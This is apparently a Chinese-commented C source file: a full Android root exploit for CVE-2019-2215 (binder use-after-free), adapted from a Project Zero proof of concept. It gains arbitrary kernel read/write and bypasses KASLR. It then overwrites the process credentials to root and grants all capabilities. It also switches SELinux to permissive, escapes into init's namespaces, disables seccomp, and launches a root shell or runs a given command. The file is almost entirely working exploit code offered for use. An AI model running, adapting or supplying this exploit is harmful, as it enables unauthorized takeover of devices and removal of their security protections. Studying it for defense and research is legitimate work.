/*
 * 使用CVE-2019-2215实现内核任意读写权限的漏洞验证程序
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 *
 * 谷歌Project Zero团队的Jann Horn和Maddie Stone
 * 由Grant Hernandez修改以实现root提权（2019年10月15日）
 *
 * 2019年10月3日
*/

#define _GNU_SOURCE
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>

/// 开始P0漏洞利用代码 ///
#define BINDER_THREAD_EXIT 0x40046208ul
// 注意：此处我们不覆盖task_struct*，保持未初始化状态
#define BINDER_THREAD_SZ 0x190
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
#define WAITQUEUE_OFFSET 0xA0
#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10

// Linux localhost 4.4.177-g83bee1dc48e8 #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019 aarch64
// 使用相同.config配置编译的pahole工具获取的数据

#define OFFSET__task_struct__thread_info__flags 0
#define OFFSET__task_struct__mm 0x520
#define OFFSET__task_struct__cred 0x790
#define OFFSET__mm_struct__user_ns 0x300
#define OFFSET__uts_namespace__name__version 0xc7
// SYMBOL_*地址相对于_head的偏移，来自userdebug版的/proc/kallsyms
#define SYMBOL__init_user_ns 0x202f2c8
#define SYMBOL__init_task 0x20257d0
#define SYMBOL__init_uts_ns 0x20255c0

#define SYMBOL__selinux_enforcing 0x23ce4a8 // Grant: 使用droidimg+miasm工具恢复

void hexdump_memory(unsigned char *buf, size_t byte_count) {
  unsigned long byte_offset_start = 0;
  if (byte_count % 16)
    errx(1, "hexdump_memory需要传入16字节对齐的数据长度");
  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
          byte_offset += 16) {
    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%08lx  ", byte_offset);
    for (int i=0; i<16; i++) {
      linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<16; i++) {
      char c = buf[byte_offset + i];
      if (isalnum(c) || ispunct(c) || c == ' ') {
        *(linep++) = c;
      } else {
        *(linep++) = '.';
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
  }
}

int epfd;

void *dummy_page_4g_aligned;
unsigned long current_ptr;
int binder_fd;

void leak_task_struct(void)
{
  struct epoll_event event = { .events = EPOLLIN };
  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "添加epoll事件失败");

  struct iovec iovec_array[IOVEC_ARRAY_SZ];
  memset(iovec_array, 0, sizeof(iovec_array));

  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* 低地址部分的spinlock必须为0 */
  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; /* wq->task_list->next */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;

  int b;
  
  int pipefd[2];
  if (pipe(pipefd)) err(1, "创建管道失败");
  if (fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000) != 0x1000) err(1, "设置管道大小失败");
  static char page_buffer[0x1000];
  //if (write(pipefd[1], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "填充管道数据失败");

  pid_t fork_ret = fork();
  if (fork_ret == -1) err(1, "fork 进程失败");
  if (fork_ret == 0){
    /* 子进程 */
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(2);
    printf("子进程: 正在执行 EPOLL_CTL_DEL 操作\n");
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
    printf("子进程: 完成 EPOLL_CTL_DEL 操作\n");
    // 第一页: 虚拟数据
    if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "读取完整管道数据失败");
    close(pipefd[1]);
    printf("子进程: 完成 FIFO 写入操作\n");

    exit(0);
  }
  //printf("父进程: 正在调用READV\n");
  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
  b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
  printf("writev() 返回 0x%x\n", (unsigned int)b);
  // 第二页: 泄露的数据
  if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "读取完整管道数据失败");
  // Grant: 如果获取current_ptr有问题，可以取消此注释
  //hexdump_memory((unsigned char *)page_buffer, sizeof(page_buffer));

  printf("父进程: 完成 READV 调用\n");
  int status;
  if (wait(&status) != fork_ret) err(1, "等待子进程失败");

  current_ptr = *(unsigned long *)(page_buffer + 0xe8);
  printf("current_ptr == 0x%lx\n", current_ptr);
}

void clobber_addr_limit(void)
{
  struct epoll_event event = { .events = EPOLLIN };
  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "添加epoll事件失败");

  struct iovec iovec_array[IOVEC_ARRAY_SZ];
  memset(iovec_array, 0, sizeof(iovec_array));

  unsigned long second_write_chunk[] = {
    1, /* iov_len */
    0xdeadbeef, /* iov_base (已使用) */
    0x8 + 2 * 0x10, /* iov_len (已使用) */
    current_ptr + 0x8, /* 下一个iov_base (addr_limit) */
    8, /* 下一个iov_len (sizeof(addr_limit)) */
    0xfffffffffffffffe /* 要写入的值 */
  };

  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* 低地址部分的spinlock必须为0 */
  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 1; /* wq->task_list->next */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x8 + 2 * 0x10; /* 前一个元素的iov_len，然后是当前和下一个元素 */
  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD;
  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = 8; /* 从开始就应正确，内核在导入时会汇总长度 */

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "创建 socket 对失败");
  if (write(socks[1], "X", 1) != 1) err(1, "写入 socket 虚拟字节失败");

  pid_t fork_ret = fork();
  if (fork_ret == -1) err(1, "fork 进程失败");
  if (fork_ret == 0){
    /* 子进程 */
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(2);
    printf("子进程: 正在执行 EPOLL_CTL_DEL 操作\n");
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
    printf("子进程: 完成 EPOLL_CTL_DEL 操作\n");
    if (write(socks[1], second_write_chunk, sizeof(second_write_chunk)) != sizeof(second_write_chunk))
      err(1, "向 socket 写入第二数据块失败");
    exit(0);
  }
  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
  struct msghdr msg = {
    .msg_iov = iovec_array,
    .msg_iovlen = IOVEC_ARRAY_SZ
  };
  int recvmsg_result = recvmsg(socks[0], &msg, MSG_WAITALL);
  printf("recvmsg() 返回 %d，期望值 %lu\n", recvmsg_result,
      (unsigned long)(iovec_array[IOVEC_INDX_FOR_WQ].iov_len +
      iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len +
      iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len));
}

int kernel_rw_pipe[2];
void kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
  errno = 0;
  if (len > 0x1000) errx(1, "超过 PAGE_SIZE 的内核写入操作不完善，尝试写入 0x%lx 字节", len);
  if (write(kernel_rw_pipe[1], buf, len) != len) err(1, "内核写入：加载用户空间缓冲区失败");
  if (read(kernel_rw_pipe[0], (void*)kaddr, len) != len) err(1, "内核写入：覆盖内核内存失败");
}
void kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
  errno = 0;
  if (len > 0x1000) errx(1, "超过 PAGE_SIZE 的内核读取操作不完善，尝试读取 0x%lx 字节", len);
  if (write(kernel_rw_pipe[1], (void*)kaddr, len) != len) err(1, "内核读取：读取内核内存失败");
  if (read(kernel_rw_pipe[0], buf, len) != len) err(1, "内核读取：写入用户空间失败");
}
unsigned long kernel_read_ulong(unsigned long kaddr) {
  unsigned long data;
  kernel_read(kaddr, &data, sizeof(data));
  return data;
}
unsigned long kernel_read_uint(unsigned long kaddr) {
  unsigned int data;
  kernel_read(kaddr, &data, sizeof(data));
  return data;
}
void kernel_write_ulong(unsigned long kaddr, unsigned long data) {
  kernel_write(kaddr, &data, sizeof(data));
}
void kernel_write_uint(unsigned long kaddr, unsigned int data) {
  kernel_write(kaddr, &data, sizeof(data));
}
/// 结束P0漏洞利用代码 ///

static char * program_name = NULL;

void usage() {
  char * name = program_name ? program_name : "do_root";
  printf("用法: %s [shell|shell_exec]\n"
      "%s shell - 启动交互式 shell\n"
      "%s shell_exec \"命令\" - 在提权后的 shell 中执行指定命令\n",
      name, name, name
  );
  exit(1);
}

void escalate()
{
#ifdef DEBUG_RW
  unsigned char cred_buf[0xd0] = {0};
  unsigned char taskbuf[0x20] = {0};
#endif

  dummy_page_4g_aligned = mmap((void*)0x100000000UL, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (dummy_page_4g_aligned != (void*)0x100000000UL)
    err(1, "4G 对齐的 mmap 分配失败");
  if (pipe(kernel_rw_pipe)) err(1, "创建内核读写管道失败");

  binder_fd = open("/dev/binder", O_RDONLY);
  epfd = epoll_create(1000);
  leak_task_struct();
  clobber_addr_limit();

  setbuf(stdout, NULL);
  printf("现在应该已获得稳定的内核读写权限 :)\n");

  unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
  printf("current->mm == 0x%lx\n", current_mm);

  unsigned long current_user_ns = kernel_read_ulong(current_mm + OFFSET__mm_struct__user_ns);
  printf("current->mm->user_ns == 0x%lx\n", current_user_ns);

  // Grant: 绕过KASLR
  unsigned long kernel_base = current_user_ns - SYMBOL__init_user_ns;
  printf("内核基地址为 0x%lx\n", kernel_base);

  if (kernel_base & 0xfffUL) errx(1, "错误的内核基地址(不是0x...000)");

  // Grant: 如需查看进程凭证与init(1)的对比，可定义此宏
  // 有助于理解设置了哪些安全标志

  /* P0: 如需操作凭证以证明可获取它们: */
#ifdef DEBUG_RW
  unsigned long init_task = kernel_base + SYMBOL__init_task;
  printf("&init_task == 0x%lx\n", init_task);
  unsigned long init_task_cred = kernel_read_ulong(init_task + OFFSET__task_struct__cred);
  printf("init_task.cred == 0x%lx\n", init_task_cred);

  kernel_read(init_task_cred, cred_buf, sizeof(cred_buf));
  printf("init->cred 凭证结构\n");
  hexdump_memory(cred_buf, sizeof(cred_buf));
#endif

  uid_t uid = getuid();
  unsigned long my_cred = kernel_read_ulong(current_ptr + OFFSET__task_struct__cred);
  // 偏移0x78是指向void * security的指针
  unsigned long current_cred_security = kernel_read_ulong(my_cred+0x78);

  printf("current->cred == 0x%lx\n", my_cred);

  // Grant: 若无法验证R/W是否正常工作，可取消注释(运行`uname -a`)
  /*unsigned long init_uts_ns = kernel_base + SYMBOL__init_uts_ns;
  char new_uts_version[] = "被攻击的内核";
  kernel_write(init_uts_ns + OFFSET__uts_namespace__name__version, new_uts_version, sizeof(new_uts_version));*/

  printf("当前 UID 为 %u\n", uid);

#ifdef DEBUG_RW
  kernel_read(my_cred, cred_buf, sizeof(cred_buf));

  printf("当前进程凭证结构\n");
  hexdump_memory(cred_buf, sizeof(cred_buf));

  kernel_read((current_ptr) & ~0xf, taskbuf, sizeof(taskbuf));
  hexdump_memory(taskbuf, sizeof(taskbuf));

  unsigned long init_cred_security = kernel_read_ulong(init_task_cred+0x78);

  kernel_read(init_cred_security, cred_buf, 0x20);
  printf("init进程的安全凭证\n");
  hexdump_memory(cred_buf, 0x20);

  kernel_read(current_cred_security, cred_buf, 0x20);
  printf("当前进程的安全凭证\n");
  hexdump_memory(cred_buf, 0x20);
#endif

  printf("正在进行权限提升...\n");

  // 将所有ID更改为root(共8个)
  for (int i = 0; i < 8; i++)
    kernel_write_uint(my_cred+4 + i*4, 0);

  if (getuid() != 0) {
    printf("将 UID 更改为 root 时出错！\n");
    exit(1);
  }

  printf("UID 已成功更改为 root！\n");

  // 重置安全位
  kernel_write_uint(my_cred+0x24, 0);

  // 将所有能力设置为完全(perm, effective, bounding)
  for (int i = 0; i < 3; i++)
    kernel_write_ulong(my_cred+0x30 + i*8, 0x3fffffffffUL);

  printf("能力集已设置为全部权限\n");

  // Grant: 这是一个失败的尝试，试图将我的SELinux SID更改为init的(sid = 7)
  // 虽然"工作"了，但进程的pty会挂起，导致无法与shell交互
  // 因此改为直接禁用SELinux
#if 0
  // 将SID更改为init
  for (int i = 0; i < 2; i++)
    kernel_write_uint(current_cred_security + i*4, 1);
  printf("[+] 准备步骤2\n");
  kernel_write_uint(current_cred_security + 0, 1);
  printf("[+] 准备步骤3\n");
  kernel_write_uint(current_cred_security + 8, 7);

  kernel_write_ulong(current_cred_security, 0x0100000001UL);

  kernel_write_uint(current_cred_security + 8, 7);
  printf("[+] SID 已更改为 init (7)\n");
#endif

  // Grant: 之前检查过此项，但未设置，故继续执行
  // printf("PR_GET_NO_NEW_PRIVS %d\n", prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0));

  unsigned int enforcing = kernel_read_uint(kernel_base + SYMBOL__selinux_enforcing);

  printf("SELinux 当前状态 = %u\n", enforcing);

  if (enforcing) {
    printf("正在将 SELinux 设置为宽容模式\n");
    kernel_write_uint(kernel_base + SYMBOL__selinux_enforcing, 0);
  } else {
    printf("SELinux 已处于宽容模式\n");
  }

  // Grant: 我们需要获得与init相同的权限，包括在全局命名空间中的挂载能力
  printf("正在重新加入 init 挂载命名空间...\n");
  int fd = open("/proc/1/ns/mnt", O_RDONLY);

  if (fd < 0) {
    perror("打开文件失败");
    exit(1);
  }

  if (setns(fd, CLONE_NEWNS) < 0) {
    perror("设置命名空间失败");
    exit(1);
  }

  printf("正在重新加入 init net 命名空间...\n");

  fd = open("/proc/1/ns/net", O_RDONLY);

  if (fd < 0) {
    perror("打开文件失败");
    exit(1);
  }

  if (setns(fd, CLONE_NEWNET) < 0) {
    perror("设置命名空间失败");
    exit(1);
  }

  // Grant: 从ADB运行时未启用SECCOMP，仅应用上下文会启用
  if (prctl(PR_GET_SECCOMP) != 0) {
    printf("正在禁用 SECCOMP\n");

    // Grant: 需要先清除任务中的TIF_SECCOMP标志，否则内核会告警
    // 清除TIF_SECCOMP标志及其他所有标志:P(可修改为仅清除单个标志)
    // arch/arm64/include/asm/thread_info.h:#define TIF_SECCOMP 11
    kernel_write_ulong(current_ptr + OFFSET__task_struct__thread_info__flags, 0);
    kernel_write_ulong(current_ptr + OFFSET__task_struct__cred + 0xa8, 0);
    kernel_write_ulong(current_ptr + OFFSET__task_struct__cred + 0xa0, 0);

    if (prctl(PR_GET_SECCOMP) != 0) {
      printf("禁用 SECCOMP 失败！\n");
      exit(1);
    } else {
      printf(" SECCOMP 已成功禁用！\n");
    }
  } else {
    printf("SECCOMP 已处于禁用状态\n");
  }

  // Grant: 至此，我们已完全突破所有限制(如果一切顺利)

#ifdef DEBUG_RW
  kernel_read(my_cred, cred_buf, sizeof(cred_buf));
  printf("------------------\n");
  hexdump_memory(cred_buf, sizeof(cred_buf));
#endif
}

int main(int argc, char * argv[]) {
  if (argc >= 1)
    program_name = argv[0];

  if (argc < 2) {
    usage();
  }

  char * applet = argv[1];
  if (strcmp(applet, "shell_exec") == 0) {
    if (argc != 3) {
      printf("shell_exec 需要指定要执行的命令\n");
      usage();
    }

    escalate();

    char * command = argv[2];

    printf("正在执行命令 \"%s\"\n", command);

    char * args2[] = {"/system/bin/sh", "-c", command, NULL};
    execve("/system/bin/sh", args2, NULL);
    perror("执行命令失败");
    exit(1);
  } else if (strcmp(applet, "shell") == 0) {

    escalate();

    printf("正在启动交互式shell！\n");
    char * args2[] = {"/system/bin/sh", NULL};
    execve("/system/bin/sh", args2, NULL);
    perror("启动 shell 失败");
    exit(1);
  } else {
    printf("未知的命令选项'%s'\n", applet);
    usage();
  }

  return 1;
}
